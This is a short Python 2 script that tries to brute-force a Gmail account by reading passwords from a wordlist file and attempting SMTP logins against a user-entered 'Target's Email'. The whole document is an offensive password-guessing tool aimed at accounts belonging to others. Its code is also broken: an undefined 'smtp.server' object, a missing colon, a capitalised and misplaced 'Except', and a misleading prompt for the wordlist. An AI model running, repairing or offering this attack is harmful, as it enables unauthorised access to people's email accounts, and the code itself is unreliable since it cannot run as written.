import smtplib
smtp.server = smtplib.SMTP("smtp.gmail.com", 587)
smtp.server.ehlo ()
smtp.server.starttls ()

user = raw_input ("Enter the Target's Email: ")
passwfile = raw_input("Enter the Target's Password: ")
passwfile = open(passwfile, "r")

for password in passwfile
try:
	  smtp.server.login (user, password)
	  print "[+] Password Found: %s"  % password                                                                                            
	  
	  break;
	  Except smtplib.SMTPAuthenticationError:
	  
	  print "[!] Password Incorrect:  %s" % password